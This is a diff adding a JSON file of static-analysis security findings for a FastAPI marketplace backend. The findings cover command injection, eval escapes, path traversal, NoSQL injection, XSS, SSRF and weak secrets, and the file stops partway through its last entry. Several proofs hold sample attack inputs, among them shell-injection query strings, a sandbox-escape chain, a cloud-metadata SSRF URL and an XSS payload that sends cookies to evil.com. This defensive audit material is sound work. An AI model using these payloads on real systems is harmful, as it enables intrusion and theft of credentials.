@@ -1,0 +1,1475 @@
+{
+  "version": "twin-distill-flash-r4",
+  "results": [
+    {
+      "check_id": "twin-round/CWE-78",
+      "path": "backend/app/seller_operations.py",
+      "start": {
+        "line": 133
+      },
+      "end": {
+        "line": 133
+      },
+      "extra": {
+        "message": "OS Command Injection via unsanitized host parameter",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-78"
+          ],
+          "citation": "status = _os.system(\"ping -c 1 \" + host)",
+          "proof": "SOURCE: The `host` parameter is a FastAPI query string parameter (line 131: `host: str = \"127.0.0.1\"`) from the HTTP request. SINK: It is concatenated directly into a shell command string passed to `os.system()` on line 133 with zero sanitization. An attacker can inject arbitrary commands via the host parameter, e.g., `?host=127.0.0.1;id` or `?host=$(id)`, achieving remote code execution on the server."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-94",
+      "path": "backend/app/seller_operations.py",
+      "start": {
+        "line": 93
+      },
+      "end": {
+        "line": 93
+      },
+      "extra": {
+        "message": "Arbitrary Python Code Injection via eval() with user expression",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-94"
+          ],
+          "citation": "result = eval(expr, {\"__builtins__\": {}}, {\"amount\": 42, \"fee\": 7})",
+          "proof": "SOURCE: The `expr` parameter is a FastAPI query string parameter (line 91: `expr: str = \"amount + fee\"`). SINK: It is passed directly to Python's `eval()` on line 93. Although `__builtins__` is set to an empty dict, this sandbox is trivially bypassed in Python 3 via dunder attribute traversal (e.g., `().__class__.__mro__[1].__subclasses__()`), allowing an attacker to access `os.system`, `subprocess.Popen`, or `open()` for arbitrary code execution and file reads."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-22",
+      "path": "backend/app/seller_operations.py",
+      "start": {
+        "line": 110
+      },
+      "end": {
+        "line": 110
+      },
+      "extra": {
+        "message": "Path Traversal allowing arbitrary file write via name parameter",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-22"
+          ],
+          "citation": "target = BASE_EXPORT_DIR / name\ntarget.parent.mkdir(parents=True, exist_ok=True)\ntarget.write_bytes(body)",
+          "proof": "SOURCE: The `name` query string parameter (line 106: `name: str = \"packet.bin\"`) and the raw HTTP request body are both attacker-controlled. SINK: On lines 108-110, `name` is joined with `BASE_EXPORT_DIR` using pathlib `/`, and `target.write_bytes(body)` writes the request body to that path. There is no path normalization check or traversal prevention. An attacker can pass `name=../../tmp/evil.sh` to write arbitrary content to any filesystem location the server process can write to, achieving remote code execution (e.g., overwriting a Python file or writing an SSH key)."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-22",
+      "path": "backend/app/seller_operations.py",
+      "start": {
+        "line": 23
+      },
+      "end": {
+        "line": 23
+      },
+      "extra": {
+        "message": "Path Traversal allowing arbitrary file write via packet_ref parameter",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-22"
+          ],
+          "citation": "target = incoming_dir / packet_ref\ntarget.write_bytes(await request.body())",
+          "proof": "SOURCE: The `packet_ref` query string parameter (line 19: `packet_ref: str = \"drop.bin\"`) and the raw request body are attacker-controlled. SINK: On lines 21-23, `packet_ref` is joined with `incoming_dir` using pathlib `/` without validation. An attacker can pass `packet_ref=../../tmp/evil` to write arbitrary file content anywhere on disk, achieving remote code execution."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-943",
+      "path": "backend/app/seller_operations.py",
+      "start": {
+        "line": 144
+      },
+      "end": {
+        "line": 144
+      },
+      "extra": {
+        "message": "NoSQL Injection via attacker-controlled MongoDB query filter",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-943"
+          ],
+          "citation": "query = payload.get(\"filter\", payload)\ndoc = MongoClient(os.environ.get(\"MONGO_URL\", \"mongodb://localhost:27017\")).ops.records.find_one(query)",
+          "proof": "SOURCE: The `payload` comes from `await request.json()` (line 141) \u2014 a fully attacker-controlled JSON body. SINK: On line 144, the payload (or its `filter` sub-key) is passed directly as a MongoDB query document to `find_one()`. No validation, sanitization, or schema enforcement is applied. An attacker can inject MongoDB operators such as `{\"$ne\": \"\"}`, `{\"$regex\": \".*\"}`, or `{\"$where\": \"sleep(5000)\"}` to bypass intended query logic, enumerate data, or potentially trigger time-based data extraction from the MongoDB instance."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-79",
+      "path": "backend/app/seller_operations.py",
+      "start": {
+        "line": 103
+      },
+      "end": {
+        "line": 103
+      },
+      "extra": {
+        "message": "Reflected XSS via Jinja2 safe-filter rendering of user card parameter",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-79"
+          ],
+          "citation": "body = Template(\"{{ card|safe }}\").render(card=card)\nreturn HTMLResponse(body)",
+          "proof": "SOURCE: The `card` query string parameter (line 101: `card: str = \"<b>pending</b>\"`) is attacker-controlled. SINK: On line 103, it is rendered into a Jinja2 template using the `|safe` filter, which explicitly marks the value as safe HTML and bypasses auto-escaping. The resulting HTML is returned via `HTMLResponse` without a CSP or charset defense. An attacker can inject arbitrary JavaScript via `?card=<script>alert(document.cookie)</script>`, achieving reflected cross-site scripting."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-601",
+      "path": "backend/app/seller_operations.py",
+      "start": {
+        "line": 44
+      },
+      "end": {
+        "line": 44
+      },
+      "extra": {
+        "message": "Open Redirect via unsanitized lane parameter",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-601"
+          ],
+          "citation": "return RedirectResponse(lane)",
+          "proof": "SOURCE: The `lane` query string parameter (line 43: `lane: str = \"/\"`) is attacker-controlled. SINK: On line 44, it is passed directly to `RedirectResponse()` with no validation, allowlist, or origin check. An attacker can craft a URL like `/ops/after/seller-lane-146?lane=https://evil.com/phish` to redirect users to arbitrary external domains, enabling phishing attacks."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-942",
+      "path": "backend/app/seller_operations.py",
+      "start": {
+        "line": 119
+      },
+      "end": {
+        "line": 119
+      },
+      "extra": {
+        "message": "Permissive CORS with credential reflection from Origin header",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-942"
+          ],
+          "citation": "origin = request.headers.get(\"origin\", \"*\")\nresponse.headers[\"Access-Control-Allow-Origin\"] = origin\nresponse.headers[\"Access-Control-Allow-Credentials\"] = \"true\"",
+          "proof": "SOURCE: The `Origin` HTTP request header is reflected directly into the CORS response (line 117-119). SINK: `Access-Control-Allow-Origin` is set to the attacker-supplied origin and `Access-Control-Allow-Credentials: true` is sent. This enables any external website to make credentialed cross-origin requests to this endpoint. Although gated by `_wrk_gate` for token authentication, if the token is known or the gate is disabled, an attacker can exfiltrate sensitive response data via the victim's browser."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-798",
+      "path": "backend/app/config.py",
+      "start": {
+        "line": 11
+      },
+      "end": {
+        "line": 11
+      },
+      "extra": {
+        "message": "Hardcoded weak secret key used for JWT, HMAC, and password reset tokens",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-798"
+          ],
+          "citation": "secret_key: str = \"change-me-in-production-please-this-is-a-dev-default-key\"",
+          "proof": "SOURCE: This is a hardcoded default in the Settings class. SINK: The `secret_key` is used in `security.py` for `jwt.encode/decode` (create_session_token, decode_session_token), for HMAC `hash_token()` used by API keys and password reset tokens, and serves as the root server secret. If a production deployment does not override this via the `.env` file or environment variable, an attacker who knows this default can forge valid JWT session tokens for any user ID, forge password reset tokens, and forge API key hashes, achieving complete authentication bypass and account takeover. The key is trivially guessable as documented in its own value ('change-me-in-production')."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-113",
+      "path": "backend/app/routers/files.py",
+      "start": {
+        "line": 95
+      },
+      "end": {
+        "line": 95
+      },
+      "extra": {
+        "message": "HTTP Response Header Injection via unsanitized filename in Content-Disposition",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-113"
+          ],
+          "citation": "\"Content-Disposition\": f'attachment; filename=\"{file.original_name}\"'",
+          "proof": "SOURCE: `file.original_name` originates from the upload's filename (storage.py line 72: `original = (file.filename or \"upload\").rsplit(\"/\", 1)[-1].rsplit(\"\\\\\", 1)[-1][:240]`). While path separators are stripped, quotes and CRLF characters are not. SINK: On line 95, the original_name is interpolated directly into the Content-Disposition header value without escaping. An attacker can upload a file with a name like `a\"\\r\\nX-Injected: true` to inject arbitrary HTTP response headers, potentially enabling cache poisoning or cross-site scripting if the response is served with a non-attachment disposition or via a proxy."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-78",
+      "path": "backend/app/seller_operations.py",
+      "start": {
+        "line": 103
+      },
+      "end": {
+        "line": 103
+      },
+      "extra": {
+        "message": "OS Command Injection via host parameter in seller_shell_probe_396",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-78"
+          ],
+          "citation": "status = _os.system(\"ping -c 1 \" + host)",
+          "proof": "UNTRUSTED SOURCE: The `host` query parameter (default '127.0.0.1') is attacker-controlled via HTTP GET query string. No sanitization, no allowlist. SINK: Directly concatenated into a shell command string passed to `os.system()`. An attacker can inject shell metacharacters (; | & ` $() ) to execute arbitrary OS commands. Data flow: HTTP GET /ops/shell/seller-probe-396?host=;id -> FastAPI route handler -> str concatenation -> os.system()."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-94",
+      "path": "backend/app/seller_operations.py",
+      "start": {
+        "line": 61
+      },
+      "end": {
+        "line": 61
+      },
+      "extra": {
+        "message": "Arbitrary Code Execution via eval() in seller_formula_cast_255",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-94"
+          ],
+          "citation": "result = eval(expr, {\"__builtins__\": {}}, {\"amount\": 42, \"fee\": 7})",
+          "proof": "UNTRUSTED SOURCE: The `expr` query parameter is attacker-controlled via HTTP GET. SINK: Passed directly to Python's built-in `eval()`. Even with __builtins__ restricted, an attacker can escape via attribute chains on literals (e.g., using `().__class__.__mro__[1].__subclasses__()`) to access dangerous classes like `subprocess.Popen` and achieve RCE. Data flow: HTTP GET /ops/formula/seller-cast-255?expr=... -> FastAPI -> eval()."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-79",
+      "path": "backend/app/seller_operations.py",
+      "start": {
+        "line": 72
+      },
+      "end": {
+        "line": 72
+      },
+      "extra": {
+        "message": "Reflected Cross-Site Scripting via Jinja2 |safe filter",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-79"
+          ],
+          "citation": "body = Template(\"{{ card|safe }}\").render(card=card)",
+          "proof": "UNTRUSTED SOURCE: The `card` query parameter is attacker-controlled via HTTP GET. SINK: Passed to Jinja2 `Template.render()` with `|safe` filter disabling HTML auto-escaping. The template is fixed as `{{ card|safe }}`, so card's value is output unescaped as HTML. An attacker can inject arbitrary HTML/JavaScript like `<script>document.location='https://evil.com/?c='+document.cookie</script>` for session theft. Data flow: HTTP GET /ops/blurb/seller-tile-321?card=<script>alert(1)</script> -> Jinja2 Template.render() |safe -> HTMLResponse."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-22",
+      "path": "backend/app/seller_operations.py",
+      "start": {
+        "line": 95
+      },
+      "end": {
+        "line": 95
+      },
+      "extra": {
+        "message": "Arbitrary File Write via Path Traversal",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-22"
+          ],
+          "citation": "target = BASE_EXPORT_DIR / name\n    target.parent.mkdir(parents=True, exist_ok=True)\n    target.write_bytes(body)",
+          "proof": "UNTRUSTED SOURCE: The `name` query parameter (default 'packet.bin') is attacker-controlled via HTTP POST. SINK: Concatenated onto BASE_EXPORT_DIR path via Path `/` operator, then request body is written. No path sanitization \u2014 `BASE_EXPORT_DIR / \"../../app/routers/evil.py\"` resolves to a directory-traversed path. `target.parent.mkdir(parents=True)` also creates parent directories, enabling arbitrary file writes. Data flow: HTTP POST body + ?name=../../app/routers/evil.py -> Path construction -> write_bytes() -> arbitrary file written."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-943",
+      "path": "backend/app/seller_operations.py",
+      "start": {
+        "line": 116
+      },
+      "end": {
+        "line": 116
+      },
+      "extra": {
+        "message": "NoSQL Injection via Unvalidated MongoDB Filter",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-943"
+          ],
+          "citation": "doc = MongoClient(os.environ.get(\"MONGO_URL\", \"mongodb://localhost:27017\")).ops.records.find_one(query)",
+          "proof": "UNTRUSTED SOURCE: The JSON request body is parsed and used directly as a MongoDB filter via `payload.get(\"filter\", payload)`. SINK: Passed directly to PyMongo `find_one()`. An attacker can inject MongoDB operators like `$regex` for data exfiltration via booleanization/timing, `$ne` to bypass filters, or `$where` for server-side JavaScript execution if enabled. Data flow: HTTP POST JSON {\"$where\": \"sleep(5000)\" or {\"$regex\": \".*\"}} -> payload.get(\"filter\", payload) -> find_one() -> unauthorized data access or DoS."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-942",
+      "path": "backend/app/seller_operations.py",
+      "start": {
+        "line": 87
+      },
+      "end": {
+        "line": 87
+      },
+      "extra": {
+        "message": "Reflective CORS with Credentials Enabled",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-942"
+          ],
+          "citation": "response.headers[\"Access-Control-Allow-Origin\"] = origin\n    response.headers[\"Access-Control-Allow-Credentials\"] = \"true\"",
+          "proof": "UNTRUSTED SOURCE: The `Origin` request header (fully attacker-controlled). SINK: Echoed verbatim as `Access-Control-Allow-Origin` response header WITH `Access-Control-Allow-Credentials: true`. Any malicious website can make authenticated cross-origin requests that include the victim's session cookies/badges. Data flow: Request Origin: https://evil.com -> reflected as Access-Control-Allow-Origin: https://evil.com + credentials: true -> cross-origin read of internal ops data."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-915",
+      "path": "backend/app/seller_operations.py",
+      "start": {
+        "line": 49
+      },
+      "end": {
+        "line": 49
+      },
+      "extra": {
+        "message": "Mass Assignment via JSON Body Merge",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-915"
+          ],
+          "citation": "workset.update(payload)",
+          "proof": "UNTRUSTED SOURCE: The full JSON request body. SINK: Merged via `dict.update()` into a workset dict containing sensitive security fields: `role`, `tier`, `approved`, `balance`. An attacker can send `{\"role\": \"admin\", \"approved\": true, \"balance\": 999999}` to escalate privileges and manipulate financial data. Data flow: HTTP POST JSON body -> dict.update() -> application state modified."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-532",
+      "path": "backend/app/seller_operations.py",
+      "start": {
+        "line": 56
+      },
+      "end": {
+        "line": 56
+      },
+      "extra": {
+        "message": "Bearer Session Token Leaked to Application Logs",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-532"
+          ],
+          "citation": "logger.warning(\"ops tally body=%s bearer=%s\", body, request.headers.get(\"authorization\"))",
+          "proof": "UNTRUSTED SOURCE: The `Authorization` request header containing the user's Bearer JWT session token. SINK: Written in plaintext to application logs via `logger.warning()`. Anyone with log access (developer, SIEM operator, attacker who gains log access) can extract session tokens for account takeover. Data flow: Request Authorization: Bearer eyJ... -> logger.warning() -> log storage (file/cloud)."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-918",
+      "path": "backend/app/routers/webhooks.py",
+      "start": {
+        "line": 19
+      },
+      "end": {
+        "line": 19
+      },
+      "extra": {
+        "message": "SSRF via Webhook URL Without Internal Network Blocklist",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-918"
+          ],
+          "citation": "def _validate_url(url: str) -> str:\n    url = url.strip()\n    lowered = url.lower()\n    if not (lowered.startswith(\"http://\") or lowered.startswith(\"https://\")):\n        raise HTTPException(...)\n    # Reject obvious local-only targets in non-dev contexts; keep simple here.\n    return url",
+          "proof": "UNTRUSTED SOURCE: The `target_url` in webhook creation payload (vendor-controlled). SINK: `_validate_url()` only checks for http/https scheme prefix but has NO blocklist for internal/private IPs (127.0.0.1, 10.x, 172.16-31.x, 192.168.x, 169.254.x). The comment explicitly acknowledges this is a simplification. A vendor can set a webhook to `http://169.254.169.254/latest/meta-data/` (AWS IMDSv1) to steal cloud credentials when the webhook is dispatched. Data flow: HTTP POST vendor webhook -> _validate_url (no internal check) -> stored -> webhook dispatcher sends HTTP request to attacker-specified URL."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-200",
+      "path": "backend/app/routers/auth.py",
+      "start": {
+        "line": 171
+      },
+      "end": {
+        "line": 171
+      },
+      "extra": {
+        "message": "Password Reset Token Exposed in HTTP Response in Development Mode",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-200"
+          ],
+          "citation": "if _settings.environment == \"development\":\n        return {\"status\": \"ok\", \"dev_reset_token\": raw_token}",
+          "proof": "UNTRUSTED SOURCE: The raw password reset token (generated server-side for a valid user email). SINK: Returned in the JSON response body when `_settings.environment == \"development\"`. If the environment is misconfigured to 'development' in production, an attacker who requests a password reset for any user's email receives the raw token in the response, enabling immediate password change and account takeover. Data flow: POST /api/auth/password-reset/request with victim's email -> token generated -> if dev mode -> returned in response body -> attacker uses token at /password-reset/confirm."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-204",
+      "path": "backend/app/routers/auth.py",
+      "start": {
+        "line": 59
+      },
+      "end": {
+        "line": 59
+      },
+      "extra": {
+        "message": "User Enumeration via Registration Response Differentiation",
+        "severity": "low",
+        "metadata": {
+          "cwe": [
+            "CWE-204"
+          ],
+          "citation": "raise HTTPException(status_code=status.HTTP_409_CONFLICT, detail=\"Email already registered\")",
+          "proof": "UNTRUSTED SOURCE: User-supplied email address at registration. SINK: The register endpoint returns HTTP 409 'Email already registered' when an email exists in the database, versus HTTP 201 (success) or HTTP 400 (weak password) for other outcomes. An attacker can enumerate which emails are registered by observing the distinct response status code. Data flow: POST /api/auth/register with email -> DB lookup -> distinct HTTP 409 vs 201/400 -> attacker builds list of valid accounts for brute-force/phishing."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-312",
+      "path": "backend/app/models.py",
+      "start": {
+        "line": 404
+      },
+      "end": {
+        "line": 404
+      },
+      "extra": {
+        "message": "Webhook Signing Secrets Stored in Plaintext in Database",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-312"
+          ],
+          "citation": "secret: Mapped[str] = mapped_column(String(128), nullable=False)",
+          "proof": "SINK: The Webhook model stores the `secret` field as plaintext (VARCHAR 128) in the database. These secrets are used to sign outgoing webhook payloads (HMAC) and verify authenticity. Any database compromise (SQL injection, backup leak, DBA access, data exfiltration) exposes all webhook secrets, enabling attackers to forge webhook deliveries or impersonate the platform. No encryption-at-rest or hashing is applied despite the secret being a credential."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-306",
+      "path": "backend/app/seller_operations.py",
+      "start": {
+        "line": 37
+      },
+      "end": {
+        "line": 37
+      },
+      "extra": {
+        "message": "Missing Authentication on Internal Ops Memo Endpoint",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-306"
+          ],
+          "citation": "@router.get(\"/fold/seller-margin-fold-024\")\nasync def seller_margin_fold_024(fold_ref: str = \"latest\"):\n    return {\"fold_ref\": fold_ref, \"seller_count\": 184, \"ops_memo\": \"renewal risk, payment flags, owner contact details\"}",
+          "proof": "SINK: `seller_margin_fold_024` is the only /ops route WITHOUT the `_wrk_gate` dependency (`gate_ref: None = Depends(_wrk_gate)` is missing). Every other /ops endpoint requires authentication via the gate. Any unauthenticated client can retrieve operational memo data including renewal risk flags, payment flags, and owner contact details \u2014 exposing sensitive business operations data. Data flow: HTTP GET /ops/fold/seller-margin-fold-024 -> no auth check -> returns sensitive memo data."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-269",
+      "path": "backend/app/seller_operations.py",
+      "start": {
+        "line": 128
+      },
+      "end": {
+        "line": 128
+      },
+      "extra": {
+        "message": "Client-controlled privilege escalation via ops badge",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-269"
+          ],
+          "citation": "badge = request.cookies.get(\"ops_badge\") or request.headers.get(\"x-ops-badge\", \"\")\n    if badge == \"lead\":\n        return {\"lane\": \"elevated\", \"payroll\": \"full\", \"casework\": \"open\"}",
+          "proof": "The `ops_badge` cookie and `x-ops-badge` header are fully attacker-controlled. Setting the badge to `lead` causes the endpoint to return privileged access (elevated lane, full payroll, open casework) without any server-side role validation. An attacker who passes the _wrk_gate can claim any role."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-400",
+      "path": "backend/app/seller_operations.py",
+      "start": {
+        "line": 66
+      },
+      "end": {
+        "line": 66
+      },
+      "extra": {
+        "message": "Unbounded memory allocation DoS in spool fan endpoint",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-400"
+          ],
+          "citation": "rows = [{\"idx\": idx, \"ref\": ref} for idx in range(count)]",
+          "proof": "The `count` query parameter is an attacker-controlled integer with no upper bound. The list comprehension immediately allocates a list of `count` dictionaries in memory. An attacker requesting a very large count (e.g., 10 million) causes server memory exhaustion and crash."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-400",
+      "path": "backend/app/seller_operations.py",
+      "start": {
+        "line": 108
+      },
+      "end": {
+        "line": 108
+      },
+      "extra": {
+        "message": "Unbounded memory allocation DoS in nonce roll endpoint",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-400"
+          ],
+          "citation": "code = \"\".join(random.choice(alphabet) for _ in range(length))",
+          "proof": "The `length` query parameter is attacker-controlled with no upper bound. The generator produces `length` characters which are joined into a single string in memory. A very large `length` causes the server to allocate excessive memory proportional to the requested length."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-338",
+      "path": "backend/app/seller_operations.py",
+      "start": {
+        "line": 108
+      },
+      "end": {
+        "line": 108
+      },
+      "extra": {
+        "message": "Insecure PRNG used for token generation",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-338"
+          ],
+          "citation": "code = \"\".join(random.choice(alphabet) for _ in range(length))",
+          "proof": "`random.choice` uses the Mersenne Twister PRNG, which is not cryptographically secure. An attacker who observes enough generated codes can predict future values, undermining any security purpose (e.g., nonce, token, or temporary credential) of the returned code."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-200",
+      "path": "backend/app/seller_operations.py",
+      "start": {
+        "line": 136
+      },
+      "end": {
+        "line": 136
+      },
+      "extra": {
+        "message": "Environment and path information disclosure",
+        "severity": "low",
+        "metadata": {
+          "cwe": [
+            "CWE-200"
+          ],
+          "citation": "return {\"trace\": trace_on, \"module\": os.environ.get(\"APP_ENV\"), \"base\": str(BASE_EXPORT_DIR)}",
+          "proof": "The endpoint returns the APP_ENV environment variable value and the server's private BASE_EXPORT_DIR path in the response body. This leaks the deployment environment name and the internal filesystem path for exports, aiding attacker reconnaissance."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-798",
+      "path": "backend/app/seller_operations.py",
+      "start": {
+        "line": 77
+      },
+      "end": {
+        "line": 77
+      },
+      "extra": {
+        "message": "Hardcoded credentials in seller_identity_hint_366",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-798"
+          ],
+          "citation": "known = {\"north\": \"4812\", \"south\": \"5930\"}\nif handle not in known:\n    return JSONResponse({\"detail\": \"unknown handle\"}, status_code=404)\nif verifier != known[handle]:\n    return JSONResponse({\"detail\": \"bad verifier\"}, status_code=403)",
+          "proof": "The dict `known` on line 77 embeds plaintext handle-verifier pairs ('north':'4812', 'south':'5930') in source code. Anyone with source access knows these credentials. The verifiers are 4-digit numeric strings (only 10,000 possibilities), making them trivially brute-forceable. The endpoint returns {'status':'queued'} on successful auth."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-1236",
+      "path": "backend/app/routers/imports_exports.py",
+      "start": {
+        "line": 132
+      },
+      "end": {
+        "line": 132
+      },
+      "extra": {
+        "message": "Incomplete CSV Formula Injection Sanitization - Tab/CR/LF Bypass",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-1236"
+          ],
+          "citation": "def _safe(value):\n    # Defuse spreadsheet formula injection on values that lead with =, +, -, @, |, %\n    if isinstance(value, str) and value and value[0] in \"=+-@|%\":\n        return \"'\" + value\n    return value",
+          "proof": "The _safe() function only sanitizes CSV values whose first character is in '=+-@|%'. However, spreadsheet applications (Excel, LibreOffice Calc, Google Sheets) also interpret cells beginning with tab (0x09), carriage return (0x0d), or line feed (0x0a) as formulas. A vendor who injects a product title or description starting with \\t bypasses this filter. When an admin exports data via /exports/orders, /exports/inventory, /exports/payouts, /exports/disputes, or /exports/audit, the resulting CSV contains executable formulas when opened in a spreadsheet application."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-367",
+      "path": "backend/app/routers/orders.py",
+      "start": {
+        "line": 84
+      },
+      "end": {
+        "line": 84
+      },
+      "extra": {
+        "message": "Race Condition / TOCTOU on Inventory in place_order",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-367"
+          ],
+          "citation": "if product.inventory < item.quantity:\n            raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail=f\"Insufficient inventory for product {item.product_id}\")\n        products[item.product_id] = product",
+          "proof": "Two concurrent POST /api/orders requests for the same low-inventory product both execute the inventory check at line 84 (which reads from the DB via db.get()), both pass because they see the same value under PostgreSQL's default READ COMMITTED isolation, then both decrement inventory at line 97 (p.inventory -= inp.quantity). No SELECT FOR UPDATE, with_for_update(), or optimistic version check is used. The redundant check at line 96 reads from the cached ORM object (products dict), not a fresh DB read, so it does not prevent the race. Result: inventory can go negative, allowing an attacker to order more items than available."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-209",
+      "path": "backend/app/routers/imports_exports.py",
+      "start": {
+        "line": 109
+      },
+      "end": {
+        "line": 109
+      },
+      "extra": {
+        "message": "Exception type name exposed in error response",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-209"
+          ],
+          "citation": "except Exception as exc:  # noqa: BLE001 - we intentionally show a generic message\n        raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail=f\"Failed to parse CSV: {type(exc).__name__}\")",
+          "proof": "The blanket `except Exception` at line 108 catches all unhandled exceptions from the CSV import loop and returns `type(exc).__name__` to the client in the HTTP 400 response body. This reveals internal Python exception class names (e.g., AttributeError, KeyError, OSError) to any authenticated vendor calling the import endpoint, giving insight into code structure and potential failure points."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-209",
+      "path": "backend/app/main.py",
+      "start": {
+        "line": 81
+      },
+      "end": {
+        "line": 81
+      },
+      "extra": {
+        "message": "Validation error handler echoes raw user input in HTTP 422 responses",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-209"
+          ],
+          "citation": "return JSONResponse(status_code=422, content={\"detail\": _json_safe_errors(exc.errors())})",
+          "proof": "When Pydantic validation fails, exc.errors() includes an 'input' key containing the raw submitted value (e.g., a password in registration/login). The _json_safe_errors function copies all error dict keys except 'ctx' unchanged. Therefore the 422 response body leaks the supplied password or other sensitive payload data back to the client verbatim."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-532",
+      "path": "backend/app/main.py",
+      "start": {
+        "line": 57
+      },
+      "end": {
+        "line": 57
+      },
+      "extra": {
+        "message": "Raw database error origin logged without redaction",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-532"
+          ],
+          "citation": "log.warning(\"IntegrityError: %s\", exc.orig if hasattr(exc, \"orig\") else exc)",
+          "proof": "User-controlled values that trigger a database IntegrityError (e.g., duplicate email, duplicate slug) are included in exc.orig. The handler writes exc.orig to application logs without any redaction, leaking PII, internal schema details, and constraint names to anyone with log access."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-208",
+      "path": "backend/app/routers/auth.py",
+      "start": {
+        "line": 111
+      },
+      "end": {
+        "line": 111
+      },
+      "extra": {
+        "message": "Login timing side-channel leaks registered email addresses",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-208"
+          ],
+          "citation": "if not user or not verify_password(payload.password, user.password_hash):",
+          "proof": "The login handler first does a DB lookup for the email. If no user is found, Python short-circuits and never calls verify_password (bcrypt). If the user exists, verify_password performs a slow bcrypt comparison (~100-200ms). The measurable response-time difference lets an attacker enumerate valid account emails despite the generic error message."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-208",
+      "path": "backend/app/routers/auth.py",
+      "start": {
+        "line": 178
+      },
+      "end": {
+        "line": 178
+      },
+      "extra": {
+        "message": "Password-reset timing side-channel leaks account existence",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-208"
+          ],
+          "citation": "if not user or not user.is_active:\n        return result",
+          "proof": "The endpoint returns 'ok' for all inputs, but the code path differs: for non-existent/inactive users it returns immediately at line 172. For active users it continues through generate_token(32), hash_token(), DB INSERT, audit.record(), and db.commit() \u2014 all of which add measurable latency. Timing differences disclose whether the email belongs to an active account."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "backend/app/routers/auth.py",
+      "start": {
+        "line": 102
+      },
+      "end": {
+        "line": 102
+      },
+      "extra": {
+        "message": "Missing Rate Limiting on Login Endpoint Allows Brute-Force Password Guessing",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "def login(\n    payload: LoginIn,\n    request: Request,\n    response: Response,\n    db: Session = Depends(get_db),",
